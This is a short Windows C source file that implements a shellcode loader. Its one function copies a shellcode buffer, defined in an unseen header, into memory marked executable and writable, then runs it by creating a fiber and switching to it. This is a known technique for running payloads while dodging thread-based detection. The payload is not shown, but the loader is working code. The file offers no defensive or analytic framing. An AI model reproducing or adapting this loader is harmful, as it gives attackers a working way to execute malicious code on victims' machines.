#include <Windows.h>
#include "AsmCodes.h"

VOID ExecuteModuleShellcodeUsingFiber()
{
	// convert main thread to fiber
	PVOID mainFiber = ConvertThreadToFiber(NULL);

	unsigned char shellcode[] = SHELLCODE;

	PVOID shellcodeLocation = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(shellcodeLocation, shellcode, sizeof(shellcode));

	// create a fiber that will execute the shellcode
	PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);

	// manually schedule the fiber that will execute our shellcode
	SwitchToFiber(shellcodeFiber);

}